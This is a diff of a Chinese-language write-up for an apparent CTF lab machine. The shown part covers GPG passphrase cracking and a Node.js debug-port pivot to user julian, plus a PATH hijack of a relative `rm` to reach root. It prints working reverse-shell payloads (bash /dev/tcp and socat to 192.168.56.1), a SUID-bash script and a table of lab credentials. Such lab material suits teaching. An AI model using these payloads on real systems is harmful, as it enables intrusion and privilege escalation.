+把错误重定向到输出，就可以按行判断文件类型：
 
 ![](images/2026-10-23-19-03-54-image.png)
 
-#### 脚本就不写了，passphrase在`/home/lenam/.local/share/nano/search_history`这个文件里
+脚本细节不再展开。关键的 passphrase 出现在 `/home/lenam/.local/share/nano/search_history`：
 
 ![](images/2026-10-23-19-35-53-image.png)
 
-```
+```text
 CzMO48xpwof8nvQ6JUhF
 ```
 
-#### 找到两个GPG密钥
+同时找到两个 GPG 密钥：
 
 ![](images/2026-10-23-19-49-48-image.png)
 
-# 回到刚才我们在user.txt拿到的，字符串，可能就是GPG的Passphrase
+### 8.6 GPG 破解与 lenam 密码
 
-```
-c25e7b68dd71d1ca9d8f86da2df12035
-```
-
-# 都失败了
+回到 `user.txt` 里的字符串 `c25e7b68dd71d1ca9d8f86da2df12035`，它也可能是 GPG 的 passphrase。尝试解密：
 
 ```bash
 gpg -d user.gpg
@@ -1561,42 +1637,54 @@ gpg -d user.gpg
 
 ![](images/2026-10-23-20-02-00-image.png)
 
-```
-You just have to remember the one that starts with love and ends with a number
-```
+失败。`note.txt` 里的 “love 开头、数字结尾” 才是 GPG passphrase 的提示。
 
-### 上面那个提示是用来破解gpg的passphrase的
+**用字典暴力跑 GPG passphrase，在现实中成功率极低**，现代 GPG 的加密算法计算成本很高。这里用 Hashcat 的 `gpg-ocb-aes2hashcat.py` 把 `.gpg` 密钥转换成 Hashcat 能识别的格式：
 
-#### 不过**用字典去暴力跑 GPG 的 Passphrase，在现实中，成功率无限趋近于零**，现代GPG的加密算法超级计算久
+![](images/2026-10-23-20-56-49-image.png)
 
-#### 下载这两个PGP密钥到本地![](images/2026-10-23-20-56-49-image.png)
-
-### 需要用Hashcat 官方工具 `gpg-ocb-aes2hashcat.py`将.gpg密钥格式转换成hashcat能识别的格式
-
-`loveboy1`是passphrase
-
-### 一个passphrase解开3个
+`loveboy1` 是 passphrase。一个 passphrase 解开了 3 个文件：
 
 ![](images/2026-10-23-20-20-09-image.png)
 
-- **`personal/private_id.gpg` -> `CzMO48xpwof8nvQ6JUhF`** (这是刚才用密钥登录ssh输入的`passphrase`
+关键结果：
 
-- **`personal/user.gpg` -> `qiFQI7buDp7zIQnAymEY`** (这是 `lenam` 用户密码)。
+- **`personal/private_id.gpg` → `CzMO48xpwof8nvQ6JUhF`**：SSH 私钥的 passphrase。
+- **`personal/user.gpg` → `qiFQI7buDp7zIQnAymEY`**：`lenam` 的用户密码。
 
-### 这个提权是真的难，其实可以一个内核漏洞脚本直接打穿的
+有了 SSH passphrase 和用户密码，就可以横向到 `lenam`。
 
-# Node.js 是一个让 JavaScript 能够在浏览器之外运行的运行时环境。
+> **阶段复盘 · 横向到 lenam**
+>
+> - **目标**：从 `www-data` 横向到普通用户。
+> - **关键发现**：`doas` 允许以 `lenam` 身份执行 `mosquitto_pub`；可用 `-f` 读取文件并发送到 Broker。
+> - **结果**：外带 `user.txt`、`note.txt`、SSH 私钥；从 nano 历史拿到 passphrase；Hashcat 破解 GPG，得到 `lenam` 密码。
+> - **下一跳**：用 `lenam` 身份触发 `julian` 的 Node.js 调试接口。
+
+## 9. 提权到 julian：Node.js 调试接口
+
+### 9.1 发现 Node 进程与 doas 规则
+
+Node.js 是让 JavaScript 在浏览器之外运行的运行时环境。
 
 ```bash
 julian     25890  3.4  3.9 1053772 79640 ?       Ssl  12:04   0:01 /home/julian/.nvm/versions/node/v22.7.0/bin/node /home/julian/.local/bin/demoadm/login.js
 ```
 
-# 这个julian运行了一个node.js,我们用doas kill来发送调试信号
+`julian` 运行了一个 Node.js 服务。`/etc/doas.conf` 中还有一条规则：
 
-`permit lenam as julian cmd /bin/kill`
-
+```text
+permit lenam as julian cmd /bin/kill
 ```
-node 进程收到kill的 SIGUSR1
+
+也就是说，`lenam` 可以以 `julian` 身份执行 `/bin/kill`。
+
+### 9.2 SIGUSR1 打开调试端口
+
+Node.js 收到 `SIGUSR1` 后会开启调试模式：
+
+```text
+node 进程收到 kill 的 SIGUSR1
   → 自动开启调试模式
   → 默认监听 localhost:9229
   → 可以用 node inspect 连进去
@@ -1604,43 +1692,58 @@ node 进程收到kill的 SIGUSR1
   → 以 julian 身份拿到 shell
 ```
 
-出现调试端口了
+按 doas 规则，命令形如 `doas -u julian /bin/kill -SIGUSR1 <PID>`；原文未记录实际执行的完整命令，PID 可从上一步的 `ps` 输出获取（例如 `25890`，若进程已重启需重新确认）。
+
+发送后，调试端口出现：
+
 ![](images/Pasted%20image%2020261024123801.png)
 
-# 然后连接
+### 9.3 连接调试器并反弹 Shell
+
+用 `julian` 的 Node 二进制连接调试端口：
 
 ```bash
 /home/julian/.nvm/versions/node/v22.7.0/bin/node inspect localhost:9229
 ```
 
-# 进入后执行反弹shell
+进入调试器后执行反弹 Shell：
 
-```bash
+```javascript
 exec("process.mainModule.require('child_process').exec('bash -c \"/bin/bash -i >& /dev/tcp/192.168.56.1/9999 0>&1\"')")
 ```
 
-# 这个调试接口会很快关闭,所以要执行命令快一点
+调试接口会很快关闭，所以要尽快执行命令：
 
 ![](images/Pasted%20image%2020261024125340.png)
 
-```
+如果命令执行成功，就会以 `julian` 身份回连。
+
+> **阶段复盘 · julian**
+>
+> - **目标**：从 `lenam` 横向到 `julian`。
+> - **关键发现**：`lenam` 可以用 `doas` 以 `julian` 身份执行 `/bin/kill`；`julian` 的 Node 服务支持通过 `SIGUSR1` 开启调试端口。
+> - **结果**：连接 `localhost:9229`，在调试器中执行 JS，以 `julian` 身份拿到 shell。
+> - **下一跳**：利用 `julian` 的 `doas` 规则提权到 root。
+
+## 10. 提权到 root：backups 与 PATH 劫持
+
+### 10.1 doas backups 规则
+
+```text
 permit setenv { PATH } julian as root cmd /usr/local/bin/backups
 ```
 
-用这个来升级为root
-`setenv { PATH }` 表示：在为目标进程创建环境时，保留调用者现有的 `PATH` 值
+`setenv { PATH }` 表示：为目标进程创建环境时，保留调用者现有的 `PATH` 值。这是后续 PATH 劫持成立的关键条件。
 
-julian的密码从图片提取出来的,没太多实战意义,直接拿来用
-`tk8QaHUi3XaMLYoP1BpZ`
+`julian` 的密码从截图提取：
 
-ldd可以查看程序运行时依赖哪些动态共享库
-它只是提供依赖信息，但可以帮助你进一步判断：
+```text
+tk8QaHUi3XaMLYoP1BpZ
+```
 
-- 是否依赖非标准共享库。
+### 10.2 分析 backups 的依赖
 
-- 是否存在异常的库搜索路径或依赖。
-
-- 是否值得继续检查动态库加载机制。
+`ldd` 可以查看程序运行时依赖哪些动态共享库：
 
 ```bash
 ldd /usr/local/bin/backups
@@ -1648,52 +1751,62 @@ ldd /usr/local/bin/backups
 
 ![](images/Pasted%20image%2020261024133422.png)
 
-`ldd` 主要查看程序运行时依赖的动态库；`readelf` 主要读取 ELF 文件本身的结构信息
+`ldd` 只提供依赖信息，但可以帮助判断：
+
+- 是否依赖非标准共享库。
+- 是否存在异常的库搜索路径或依赖。
+- 是否值得继续检查动态库加载机制。
+
+`readelf` 读取 ELF 文件本身的结构信息：
 
 ```bash
 readelf -d /usr/local/bin/backups
 ```
 
-显示动态段
 动态段中常见的信息包括：
 
 - `NEEDED`：程序依赖的共享库。
-- `RPATH`和`RUNPATH`：指定的动态库搜索路径。
-  ![448](images/Pasted%20image%2020261024134428.png)
+- `RPATH` / `RUNPATH`：指定的动态库搜索路径。
 
-# 用string可以看出`dlopen`、`dlsym`、`dlclose`,会加载动态库
+![448](images/Pasted%20image%2020261024134428.png)
 
-## 发现有个library加载错误,在`/var/www/sunfriends.nyx/database.sql.gz`下
+用 `strings` 可以看到 `dlopen`、`dlsym`、`dlclose`，说明程序会动态加载库。检查过程中出现库加载错误；随后在 `/var/www/sunfriends.nyx/database.sql.gz` 中解出 `libbackup.so`：
 
 ![](images/Pasted%20image%2020261024135742.png)
 
-![440](images/Pasted%20image%2020261024141746.png)解码出是个`libbackup.so`
+![440](images/Pasted%20image%2020261024141746.png)
 
-# 这个不是常见的系统动态库,应该是这个backups脚本自带的动态库,去看一下这个动态库
+`libbackup.so` 不是常见的系统动态库，应该是 `backups` 自带的库。继续查看：
 
 ![](images/Pasted%20image%2020261024142040.png)
 
 ![](images/Pasted%20image%2020261024142233.png)
-发现所有人可读
+
+发现该文件所有人可读：
+
 ![](images/Pasted%20image%2020261024142409.png)
 
-`rm`是相对路径,可以PATH Hijack了
+库中调用 `rm` 时使用的是相对路径，而不是 `/bin/rm`。结合 doas 保留 `PATH` 的规则，可以劫持 `rm`。
 
-在/tmp写个反弹shell命名为rm,需要给x权限
+### 10.3 PATH 劫持
+
+`doas` 规则保留 `julian` 的 `PATH`，所以只要把恶意程序命名为 `rm`，放进 `julian` 的 `PATH` 目录，`backups` 以 root 运行时就会执行它。
+
+作者最终把恶意脚本放在 `~/.local/bin/rm`。先看一种更直接的反弹 Shell 思路：
 
 ```bash
 socat TCP:192.168.56.1:2222 EXEC:'bash',pty,stderr,setsid,sigint,sane
 ```
 
-监听
+监听端：
 
 ```bash
 socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:2222
 ```
 
-这样弹回来的shell只是用不了rm这个命令,可以按作者那样写脚本,将root的/bin/bash复制到/tmp/bash 然后就可以进入root的shell了
+这样弹回来的 shell 只是用不了 `rm` 命令。更稳妥的做法是让恶意 `rm` 复制 SUID bash：
 
-```
+```bash
 julian@solar:~$ nano .local/bin/rm
 
 julian@solar:~$ cat .local/bin/rm
@@ -1705,19 +1818,22 @@ chmod u+s /tmp/bash
 julian@solar:~$ chmod +x .local/bin/rm
 ```
 
-```
+然后以 root 运行 `backups`。先随便传一个不存在的数据库名：
+
+```bash
 julian@solar:/tmp$ doas /usr/local/bin/backups nio
 doas (julian@solar) password:
 mysqldump: Got error: 1049: "Unknown database 'nio'" when selecting the database
 Error executing mysqldump and gzip. Exit code: 512
 ```
 
-我们需要找一个存在的数据库名字,
+说明 `backups` 会先执行 `mysqldump`，需要一个存在的数据库名。数据库备份文件在 `/var/www/sunfriends.nyx/database.sql.gz`：
+
 ![](images/Pasted%20image%2020261024145450.png)
 
-这是数据库备份文件,预览查看里面的数据库名字
+这是数据库备份文件，预览里面的数据库名：
 
-```
+```bash
 gzip -dc /var/www/sunfriends.nyx/database.sql.gz
 ```
 
@@ -1725,11 +1841,79 @@ gzip -dc /var/www/sunfriends.nyx/database.sql.gz
 
 ![](images/Pasted%20image%2020261024150232.png)
 
-# 终于结束了,闹麻了
+拿到实际数据库名后，再次执行 `doas /usr/local/bin/backups <数据库名>`。`backups` 以 root 运行，调用恶意 `rm`，执行 `cp /bin/bash /tmp/` 和 `chmod u+s /tmp/bash`。
 
-程序运行动态库或PATH劫持方法:
+SUID bash 生成后，即可用它进入 root shell。
 
-- 静态分析： `file`、`strings`、`readelf` 用于寻找文件类型、字符串、动态依赖等线索。
-- 运行时分析： 如果程序会动态加载库，使用适当的跟踪工具观察实际加载行为。
-- 调用链分析： 检查共享库如何执行外部命令，尤其关注 `system()`、命令拼接和未使用绝对路径的命令。
-- 权限链验证： 判断普通用户是否能控制被执行的文件，以及该文件最终会以什么权限运行。
+> **阶段复盘 · root**
+>
+> - **目标**：从 `julian` 提权到 root。
+> - **关键发现**：`doas` 允许以 root 运行 `/usr/local/bin/backups` 并保留 `PATH`；`libbackup.so` 调用 `rm` 时使用相对路径。
+> - **结果**：在 `PATH` 目录放置恶意 `rm`，`backups` 以 root 执行它，复制 SUID bash，拿到 root shell。
+
+## 11. 复盘与速查
+
+### 11.1 动态库与 PATH 劫持的检查方法
+
+- **静态分析**：`file`、`strings`、`readelf` 用于寻找文件类型、字符串、动态依赖等线索。
+- **运行时分析**：如果程序会动态加载库，使用适当的跟踪工具观察实际加载行为。
+- **调用链分析**：检查共享库如何执行外部命令，尤其关注 `system()`、命令拼接和未使用绝对路径的命令。
+- **权限链验证**：判断普通用户是否能控制被执行的文件，以及该文件最终会以什么权限运行。
+
+### 11.2 踩坑与修正
+
+| 现象                         | 原因                                          | 修正                                                    |
+| ---------------------------- | --------------------------------------------- | ------------------------------------------------------- |
+| `new Image()` 外带无数据     | HTTPS 页面请求 HTTP 资源被浏览器拦截或升级    | 改用 `location.href`                                    |
+| GET 外带 414                 | `btoa(encodeURIComponent())` 使 URL 过长      | 用 `btoa(String.fromCharCode(...))` 压缩；POST 也被丢弃 |
+| `/records` 路径穿越 404      | `basename()` 拦截穿越，且只允许 `.json`       | 从 `index.php` 源码确认，改读 `/var/www/` 下的源码      |
+| 发布 `record` 后服务器无请求 | PDF 只在点击下载时生成                        | 先下载 PDF 触发渲染                                     |
+| MQTT 命令提示缺少 `name`     | 首次 Payload 没带 `name` 字段                 | 补上 `name` 后再发送                                    |
+| 直接向 MQTT 发命令无输出     | MQTT 只落命令文件，需在 `server.php` 面板执行 | 上传命令文件后手动执行                                  |
+| 原文路径写成 `sesion.php`    | 少一个 `s`，照抄会读取失败                    | 按实际文件名修正                                        |
+| webshell 返回 `ok` 但无回连  | 本地 `server.py` 的问题                       | 改用 `python3` 启动 HTTP 服务                           |
+| GPG passphrase 猜错          | `user.txt` 字符串不是 GPG passphrase          | 从 nano 历史取 SSH passphrase；用 Hashcat 破解 GPG      |
+
+### 11.3 整条链复习清单
+
+- [ ] 443 证书 SAN 枚举域名
+- [ ] 目录爆破拿到登录页和 `database.sql.gz`
+- [ ] 登录后台，源码泄露 MQTT 凭据
+- [ ] MQTT `data` 主题 + `innerHTML` → DOM XSS
+- [ ] 盲打管理员，外带 dashboard 源码，拿到 admin MQTT 凭据
+- [ ] `/records?download=true&file=` → `basename()` 拦截
+- [ ] PDF 元数据 → `wkhtmltopdf 0.12.6.1` → CVE-2022-35583
+- [ ] `record` 主题 `chart` 字段闭合 → `file://` 读源码
+- [ ] `server.php` + `server/command/new` 异步命令队列 → webshell
+- [ ] `doas` + `mosquitto_pub -f` 外带文件
+- [ ] `nano` 历史记录 → passphrase；GPG → `lenam` 密码
+- [ ] `doas kill` → Node.js `SIGUSR1` → 9229 → `julian`
+- [ ] `backups` + `libbackup.so` 相对路径 `rm` + `setenv { PATH }` → root
+
+### 11.4 关键凭据速查
+
+| 身份 / 用途                       | 凭据                                  |
+| --------------------------------- | ------------------------------------- |
+| MQTT 普通用户                     | `user` / `1tEa15klQpTx9Oub6ENG`       |
+| MQTT 管理员                       | `admin` / `tJH8HvwVwC57BR6CEyg5`      |
+| `server.php` / MQTT               | `5up3r` / `bloods`                    |
+| MySQL（`login.php` 内）           | `solar_user` / `lD5vkvLfMowAiaT7w64C` |
+| `user.txt` 字符串                 | `c25e7b68dd71d1ca9d8f86da2df12035`    |
+| SSH / `private_id.gpg` passphrase | `CzMO48xpwof8nvQ6JUhF`                |
+| GPG passphrase                    | `loveboy1`                            |
+| `lenam` 密码                      | `qiFQI7buDp7zIQnAymEY`                |
+| `julian` 密码                     | `tk8QaHUi3XaMLYoP1BpZ`                |
+
+### 11.5 关键 Topic 速查
+
+| Topic                   | 作用                                                           |
+| ----------------------- | -------------------------------------------------------------- |
+| `data`                  | 设备/后端发布 JSON，前端订阅并写入 `innerHTML`；DOM XSS 注入点 |
+| `record`                | 前端发布图表数据；后端保存为 JSON，下载 PDF 时渲染 `chart`     |
+| `server/command/output` | `server.php` 执行命令后发布结果                                |
+| `server/command/new`    | MQTT 输入端，用于生成 `commands/` 下的命令文件                 |
+| `test`                  | 用 `mosquitto_pub -f` 外带文件时使用的主题                     |
+
+### 11.6 主线总结
+
+> 这条链的核心不是单个漏洞，而是“**凭据复用 + 信任边界**”：Web 源码泄露 MQTT 凭据 → MQTT 数据被前端信任 → 管理员浏览器被 XSS → PDF 生成器信任 HTML → 后台命令队列信任 MQTT 消息 → `doas` 配置信任环境变量。每一跳都在把上一跳的权限或数据，交给下一跳继续利用。
